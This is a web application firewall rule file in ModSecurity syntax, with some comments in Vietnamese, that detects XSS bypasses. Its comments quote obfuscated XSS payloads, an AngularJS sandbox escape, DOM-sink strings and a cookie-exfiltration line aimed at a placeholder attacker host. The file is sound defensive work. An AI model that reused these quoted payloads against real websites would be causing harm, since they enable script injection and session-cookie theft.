# ============================================================================
# LỚP 6: URI BACKSTOP + GENERALIZED EXECUTION PATTERNS (Iteration 1 patch)
# Mục tiêu: bịt khe hở URLPath placement + bổ sung pattern execution mới
# Rule ID: 9942090-9942098
# ============================================================================

# Rule 9942090: Mark path that looks base64-only (Gotestwaf "Base64Flat" placeholder).
SecRule REQUEST_FILENAME \
    "@rx ^/[A-Za-z0-9+/]{12,}={0,2}/?$" \
    "id:9942090,\
    phase:2,\
    pass,\
    nolog,\
    t:none,\
    setvar:'tx.uri_looks_b64=1'"

# Rule 9942092: Decode REQUEST_FILENAME via base64DecodeExt (lenient padding) and check XSS.
SecRule TX:uri_looks_b64 "@eq 1" \
    "id:9942092,\
    phase:2,\
    chain,\
    t:none,\
    block,\
    msg:'XSS-v2 L6: Base64-encoded XSS in URI path',\
    logdata:'Path: %{REQUEST_FILENAME}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/URI_BASE64'"
    SecRule REQUEST_FILENAME \
        "@rx (?i)(?:<(?:script|img|body|svg|iframe|object|details|video|audio|input|marquee|a\b|p\b|x[\s/>])|on[a-z]{2,25}\s*=|javascript\s*:|vbscript\s*:|(?:alert|confirm|prompt|eval|setinterval|settimeout|atob|fetch)\s*[.(]|(?:alert|confirm|prompt)\s*\.\s*(?:call|apply|bind)|\.constructor\s*\(\s*['\"]|__proto__\s*\[|<<\s*scr|autof.{0,5}ocus.{0,30}onfocus|\(\s*(?:alert|confirm|prompt|eval)\s*\)|&(?:lt|gt|equals|lpar|rpar);|&#x?0*(?:3[cde]|28|29|40|41))" \
        "t:none,t:base64DecodeExt,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase"

# Rule 9942093: URI backstop - HTML tag + execution context in URL path/filename
# Bao gồm: path payload sau urlDecodeUni + htmlEntityDecode
SecRule REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:<(?:script|svg|img|body|iframe|object|details|video|audio|input|marquee|a\s|p\s|x[\s/>])[^>]*(?:on[a-z]{2,25}\s*=|src\s*=|href\s*=|onload|onerror|onclick|onfocus|onmouseover|onpointer|onauxclick|onwheel|ontoggle)|on[a-z]{2,25}\s*=\s*['\"]?\s*(?:alert|confirm|prompt|eval|fetch|location|document|window|prompt|atob|Function|setInterval|setTimeout|\w+\s*\())" \
    "id:9942093,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:jsDecode,\
    t:removeNulls,\
    t:compressWhitespace,\
    block,\
    msg:'XSS-v2 L6: URI path injection with execution context',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/URI_INJECT'"

# Rule 9942094: URI backstop - javascript: protocol + execution in path
SecRule REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:javascript\s*:|vbscript\s*:|data\s*:\s*text/html)[^/?]*(?:alert|confirm|prompt|eval|set(?:Timeout|Interval)|atob|fetch|document\.)" \
    "id:9942094,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L6: javascript:/vbscript: URI scheme in path',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/URI_PROTOCOL'"

# Rule 9942095: Generalized execution patterns missed by L1
# Bao gồm: .call/.apply/.bind, paren-wrap, constructor, setInterval+concat
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:Referer|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:(?:alert|confirm|prompt|eval)\s*\.\s*(?:call|apply|bind)\s*\(|\(\s*(?:alert|confirm|prompt|eval)\s*\)\s*[\(`]|(?:set(?:Timeout|Interval)|eval|Function)\s*\(\s*['\"`][^'\"`]{0,30}['\"`]\s*\+\s*['\"`]|\.constructor\s*\(\s*['\"`][^'\"`]{0,80}['\"`]\s*\)\s*\(\s*\)|__proto__\s*\[[^\]]+\]\s*=)" \
    "id:9942095,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:jsDecode,\
    t:removeNulls,\
    t:compressWhitespace,\
    block,\
    msg:'XSS-v2 L6: Generalized JS execution (call/apply/wrap/constructor)',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/EXEC_GEN'"

# Rule 9942096: HTML entity bypass with zero-padded numeric refs (covers &#0000000040)
# Bắt: confirm&#0000000040, alert&#x28, prompt&#0040
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:(?:alert|confirm|prompt|eval)\s*&(?:#0*(?:40|x0*28));?|&(?:#0*(?:60|62)|#x0*(?:3c|3e)|lt|gt);[^<>]*&(?:#0*(?:60|62)|#x0*(?:3c|3e)|lt|gt);?|&(?:equals|#0*61|#x0*3d);\s*(?:alert|confirm|prompt|eval)|&(?:lpar|#0*40|#x0*28);)" \
    "id:9942096,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L6: Numeric HTML entity bypass (zero-padded)',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:ERROR,\
    setvar:'tx.xss_score_v2=+%{tx.error_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl3=+%{tx.error_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/ENTITY_NUM'"

# Rule 9942097: Tag fragmentation / null-byte / double < bypass (autof<x>ocus, <<script)
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:<\s*<\s*scr|autof(?:<[^>]*>)?ocus\s+o(?:<[^>]*>)?nfocus|on[a-z]{2,25}\s*=\s*\(\s*(?:alert|confirm|prompt|eval)\s*\)|<[a-z]+/on[a-z]{2,25}\s*=\s*(?:alert|confirm|prompt|eval|0|\w+\s*\(|\[\d*\]\.))" \
    "id:9942097,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L6: Tag fragmentation / split-tag bypass',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/TAG_FRAG'"

# Rule 9942098: Generic event handler with function call (catches onwheel=ead(...))
# Bắt mọi on*= mà có function call nào đó, không chỉ alert/confirm/prompt
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)\bon(?:abort|auxclick|blur|cancel|canplay|change|click|close|contextmenu|copy|cuechange|cut|dblclick|drag|drop|durationchange|emptied|ended|error|focus|focusin|focusout|formdata|hashchange|input|invalid|keydown|keypress|keyup|load|loadeddata|loadedmetadata|loadstart|message|mousedown|mouseenter|mouseleave|mousemove|mouseout|mouseover|mouseup|mousewheel|offline|online|pagehide|pageshow|paste|pause|play|playing|pointer\w+|popstate|progress|ratechange|reset|resize|scroll|search|seeked|seeking|select|show|stalled|storage|submit|suspend|timeupdate|toggle|touchcancel|touchend|touchmove|touchstart|transitionend|unload|volumechange|waiting|wheel)\s*=\s*['\"]?\s*\w+\s*\(" \
    "id:9942098,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:jsDecode,\
    t:removeNulls,\
    t:compressWhitespace,\
    block,\
    msg:'XSS-v2 L6: Generic event handler with function call',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/EVT_GEN'"

# ============================================================================
# LỚP 7: RECALL BOOSTERS (Iter-4 sau phân tích Mereani)
# ============================================================================

# Rule 9942100: String.fromCharCode obfuscation - chuỗi số nguyên dài
# Bắt: String.fromCharCode(60,115,99,...) — đặc trưng obfuscation XSS
# Cũng bắt: document.write(...fromCharCode...)
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI \
    "@rx (?i)(?:String\s*\.?\s*fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){2,}|(?:document|window|location|self|top|parent)\s*\.\s*(?:write|writeln|location|href)\s*[(=][^)]{0,200}(?:fromCharCode|atob\s*\(|unescape\s*\(|String\.|eval\s*\()|atob\s*\(\s*['\"`][A-Za-z0-9+/=]{12,}['\"`]\s*\))" \
    "id:9942100,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:jsDecode,\
    t:removeNulls,\
    t:lowercase,\
    block,\
    msg:'XSS-v2 L7: fromCharCode / atob / document.write obfuscation',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/FROMCHARCODE'"

# Rule 9942101: HTML5-entity-obfuscated javascript: protocol
# Bắt: src=j&tab;a&tab;v&tab;a&tab;s&tab;c&tab;r&tab;i&tab;p&tab;t:
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI \
    "@rx (?i)(?:src|href|data|action|formaction|background|poster|codebase)\s*=\s*['\"]?\s*j(?:&(?:tab|newline|Tab|NewLine|nbsp|#0*9|#0*10|#0*13|#x0*9|#x0*a|#x0*d);|[\s\x00-\x1f])*a(?:&(?:tab|newline|Tab|NewLine|nbsp|#0*9|#0*10|#0*13|#x0*9|#x0*a|#x0*d);|[\s\x00-\x1f])*v(?:&(?:tab|newline|Tab|NewLine|nbsp|#0*9|#0*10|#0*13|#x0*9|#x0*a|#x0*d);|[\s\x00-\x1f])*a(?:&(?:tab|newline|Tab|NewLine|nbsp|#0*9|#0*10|#0*13|#x0*9|#x0*a|#x0*d);|[\s\x00-\x1f])*s(?:&(?:tab|newline|Tab|NewLine|nbsp);|[\s\x00-\x1f])*c(?:&(?:tab|newline|Tab|NewLine|nbsp);|[\s\x00-\x1f])*r(?:&(?:tab|newline|Tab|NewLine|nbsp);|[\s\x00-\x1f])*i(?:&(?:tab|newline|Tab|NewLine|nbsp);|[\s\x00-\x1f])*p(?:&(?:tab|newline|Tab|NewLine|nbsp);|[\s\x00-\x1f])*t" \
    "id:9942101,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: HTML5-entity-obfuscated javascript: protocol',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/JS_ENTITY_OBFUSC'"

# Rule 9942102: Reference XSS-archive domains as redirect target / parameter value
# Bắt: ?param=http://xssed.com, ?ref=ha.ckers.org, redirect=insecurity.ro
# Đặc trưng: known XSS-test domains chỉ xuất hiện trong payload XSS thực sự.
SecRule ARGS|REQUEST_COOKIES|REQUEST_BODY|REQUEST_URI \
    "@rx (?i)(?:https?:)?//[\w.-]*(?:xssed\.(?:com|net|org|info)|vuln\.xssed|ha\.ckers\.org|insecurity\.ro|attacker\.site|evil\.com|0x\.lv|xss\.cx|xss\.io|xsshunter|googlebig\.com)" \
    "id:9942102,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: Known XSS-archive / attacker domain reference',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/KNOWN_DOMAIN'"

# Rule 9942103: Open redirect — ARG name is a known redirect target AND value is http(s)://
# Sử dụng explicit ARG name list (ModSec không hỗ trợ dynamic %{MATCHED_VAR_NAME} reference)
SecRule ARGS:redirect|ARGS:redir|ARGS:redirectto|ARGS:url|ARGS:next|ARGS:goto|ARGS:jumpto|ARGS:target|ARGS:return_url|ARGS:returnurl|ARGS:returnto|ARGS:destination|ARGS:forward|ARGS:appredirect|ARGS:referer|ARGS:nologin|ARGS:go|ARGS:dest|ARGS:to|ARGS:url_redirect|ARGS:rurl|ARGS:qscr|ARGS:mtr|ARGS:urlpage|ARGS:callback|ARGS:continue|ARGS:ref|ARGS:click|ARGS:link|ARGS:src|ARGS:location|ARGS:cb|ARGS:q|ARGS:oadest|ARGS:navurl|ARGS:gourl|ARGS:surl|ARGS:forwardurl|ARGS:appredir|ARGS:sendto|ARGS:targeturl|ARGS:img|ARGS:file|ARGS:path|ARGS:f|ARGS:d|ARGS:r|ARGS:adgroup|ARGS:requestedurl|ARGS:redirurl|ARGS:page|ARGS:clicktag|ARGS:to_url|ARGS:jump|ARGS:click_url|ARGS:searchfor|ARGS:fwd|ARGS:dst|ARGS:frame|ARGS:view|ARGS:next_url|ARGS:image|ARGS:domain|ARGS:host|ARGS:site|ARGS:out|ARGS:loc|ARGS:where|ARGS:action|ARGS:forward_to|ARGS:exec|ARGS:start \
    "@rx (?i)^\s*['\"]?\s*https?(?::|%3A)//" \
    "id:9942103,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: Redirect-style param value is absolute URL',\
    logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/OPEN_REDIRECT_ABS'"

# Rule 9942103b: ARG value contains ?param=http:// (URL embedded in value)
SecRule ARGS|REQUEST_URI \
    "@rx (?i)(?:\?|&amp;|&)[a-z_][a-z0-9_-]{0,30}(?:<br>)?\s*=\s*['\"]?\s*(?:<br>)?\s*https?(?::|%3A)//" \
    "id:9942108,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: URL value embeds another http(s):// after ?param=',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/EMBEDDED_URL'"

# Rule 9942104: URL-encoded HTML tag in path/query (no literal < character)
# Bắt: /%3cimg_src%3d, %3cscript%3e, %3ciframe — sau urlDecodeUni vẫn còn dạng <tag>
# Lý do: rule 9942099 yêu cầu URL parameter structure; rule này bắt tag URL-encoded thuần.
SecRule ARGS|REQUEST_COOKIES|REQUEST_URI \
    "@rx (?i)[/?&=]\s*['\"]?\s*>?\s*<\s*/?\s*(?:script|iframe|svg|marquee|object|embed|applet|img|body|details|video|audio|input|form|button|h[1-6]|font|style|link|meta|a\b|p\b|div|span|x\b)\b" \
    "id:9942104,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: HTML tag injected after URL special char',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/URLENC_TAG'"

# Rule 9942105: Underscore-encoded XSS (Monster jobsearch style: __22__3e__3ciframe...)
# Bắt: __<hex> dạng encoding thay vì %<hex>
SecRule ARGS|REQUEST_COOKIES|REQUEST_URI \
    "@rx (?i)__(?:22|27)__3[Ee]__3[Cc]|__3[Cc](?:69|73|6[ad]|62|66|76|61|70|68|2f)" \
    "id:9942105,\
    phase:2,\
    t:none,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: Underscore-encoded HTML/script bypass',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/UNDERSCORE_ENC'"

# Rule 9942106: Known XSS-archive domain mentioned anywhere (without requiring protocol prefix)
SecRule ARGS|REQUEST_COOKIES|REQUEST_URI \
    "@rx (?i)\b(?:xssed\.(?:com|net|org|info)|vuln\.xssed|ha\.ckers\.org|insecurity\.ro|googlebig\.com|xsshunter\.com|0x\.lv)\b" \
    "id:9942106,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: XSS-archive domain reference (any context)',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/KNOWN_DOMAIN_BARE'"

# Rule 9942107: URL path contains XSS keyword sequence (script-alert-cookie-script style)
# Bắt URL path có chuỗi từ khóa XSS được nối bằng `-` hoặc `_` (URL-safe encoding)
SecRule REQUEST_URI|ARGS \
    "@rx (?i)(?:[/-_])(?:script|iframe|svg|img|alert|prompt|confirm|eval|onload|onerror|onclick|onmouseover|cookie|document|window|location|fromCharCode|atob)(?:[-_]+(?:script|iframe|svg|img|alert|prompt|confirm|eval|onload|onerror|onclick|onmouseover|cookie|document|window|location|fromCharCode|atob|pwn|xss|hack|hacked|hi-x|fuck)){2,}" \
    "id:9942107,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:lowercase,\
    block,\
    msg:'XSS-v2 L7: URL contains XSS keyword sequence (hyphen-encoded)',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/URL_KEYWORD_SEQ'"

# Rule 9942109: URL with redirect/embedded-URL pattern allowing <br> artifact
# Bắt: oade<br>st=http://... — <br> chen vào giữa param name (dataset artifact / split-tag XSS)
SecRule ARGS|REQUEST_URI \
    "@rx (?i)(?:\?|&amp;|&)[a-z_][a-z0-9_-]{0,15}<br>[a-z_][a-z0-9_-]{0,15}\s*=\s*['\"]?\s*https?(?::|%3A)//" \
    "id:9942109,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: Open redirect with <br> split in param name',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/BR_REDIRECT'"

# Rule 9942110: XSS keyword sequence in path (extended starter keywords)
# Bắt /pwnscriptalert..., /textareascriptalert..., script-alert-document-cookie
SecRule REQUEST_URI|ARGS \
    "@rx (?i)(?:[/_-]|^)(?:pwn|xss|hack|hacked|hi-x|defaced|fuck|midis|textarea)(?:script|alert|prompt|confirm|eval|cookie|document|window|location|iframe|svg|onload|onerror)(?:[a-z]*)(?:[-_]?(?:script|alert|prompt|confirm|eval|cookie|document|window|location|iframe|svg|onload|onerror|pwn|xss|hack)){1,}" \
    "id:9942110,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:lowercase,\
    block,\
    msg:'XSS-v2 L7: URL path embeds XSS keyword sequence (extended)',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/URL_KEYWORD_EXT'"

# Rule 9942111: %22%3e... break-out + content in query (recovers URL-encoded breakouts)
# `?param=%22%3e...` after urlDecodeUni = `?param=">..."` — likely XSS payload  
SecRule ARGS|REQUEST_URI \
    "@rx (?i)(?:\?|&amp;|&)[a-z_][a-z0-9_-]{0,30}\s*=\s*['\"]?(?:%22%3[eE]|%27%3[eE]|\"\>|'\>|&quot;&gt;|&#x?22&#x?3e)" \
    "id:9942111,\
    phase:2,\
    t:none,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 L7: URL parameter value begins with quote+gt breakout',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/PARAM_BREAKOUT'"

# ============================================================================
# PATCH SET: WAF-BYPASS XSS DETECTION (Added 2026-05-14)
# Targets waf-bypass-xss bypasses: bracket-notation, numeric-toString radix,
# cookie-exfil via onreset/concat, AngularJS sandbox, DOM source sinks.
# Rule ID: 9942115-9942119
# ============================================================================

# Rule 9942115: Bracket-notation function execution (plain + base64 context)
# Covers: top['alert'](1), top['al\145rt'](1), window['eval'](...),
#   self['Function']('alert(1)')()
# Applied to both raw and base64-decoded values.
SecRule ARGS|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)\b(?:top|window|self|parent|frames|globalThis)\s*\[\s*['\"][^'\"]{1,30}['\"]\s*\]\s*\(" \
    "id:9942115,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:base64Decode,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:jsDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 bypass: bracket-notation function call (top[string]()',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/BRACKET_NOTATION'"

# Rule 9942116: Numeric-toString-radix obfuscation
# Covers: top[8680439..toString(30)](1)  — number in base N spells keyword
# Pattern: window/top[<number>.toString(<radix>)](<args>)
SecRule ARGS|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)\b(?:top|window|self|parent|frames|globalThis)\s*\[\s*\d+\s*\.\s*\.\s*toString\s*\(\s*\d+\s*\)\s*\]\s*\(" \
    "id:9942116,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:base64Decode,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 bypass: numeric-to-string radix obfuscation (N.toString(r))',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/NUM_TOSTRING'"

# Rule 9942117: Cookie exfiltration via location + concat (base64-decoded form)
# Covers: location="http://attacker?cookie=".concat(document.cookie)
#   / location.href=...cookie  / location=...+cookie
SecRule ARGS|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:location\s*(?:\.href)?\s*=\s*['\"][^'\"]{0,50}attacker|location\s*=\s*['\"][^'\"]{0,80}cookie|['\"][^'\"]{0,100}(?:cookie|document)\s*['\"]\.concat\s*\(|\.concat\s*\(\s*(?:document\s*\.\s*cookie|test\s*\.\s*cookie)\s*\))" \
    "id:9942117,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:base64Decode,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 bypass: cookie exfiltration via location+concat',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/COOKIE_EXFIL'"

# Rule 9942118: AngularJS sandbox escape via constructor.constructor
# Covers: {{constructor.constructor('alert(1)')()}}  / ng-app ng-csp + constructor
SecRule ARGS|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:\{\{\s*constructor\s*\.\s*constructor\s*\(|ng-(?:app|csp)\b[^>]*\{\{[^}]*constructor)" \
    "id:9942118,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:base64Decode,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 bypass: AngularJS sandbox escape via constructor.constructor',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/ANGULARJS_SANDBOX'"

# Rule 9942119: DOM source sinks (location.hash / eval(url.slice) / document.write+decodeURI)
# Covers: eval(location.hash.slice(1)) / eval(url.slice(-8)) #alert(1)
#   / document.write(decodeURI(location.hash)) / innerHTML=location.hash
SecRule ARGS|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_URI|REQUEST_FILENAME \
    "@rx (?i)(?:eval\s*\(\s*(?:location|url)[\s.]\w*(?:slice|hash|search|href)|innerHTML\s*=\s*location\s*\.\s*hash|document\s*\.\s*write\s*\(\s*decodeURI\s*\(\s*location)" \
    "id:9942119,\
    phase:2,\
    t:none,\
    t:urlDecodeUni,\
    t:base64Decode,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:removeNulls,\
    block,\
    msg:'XSS-v2 bypass: DOM source sink (eval/innerHTML=location.hash)',\
    logdata:'Matched: %{MATCHED_VAR}',\
    severity:CRITICAL,\
    setvar:'tx.xss_score_v2=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    tag:'attack-xss',\
    tag:'OWASP_CRS/XSS-v2/DOM_SOURCE_SINK'"
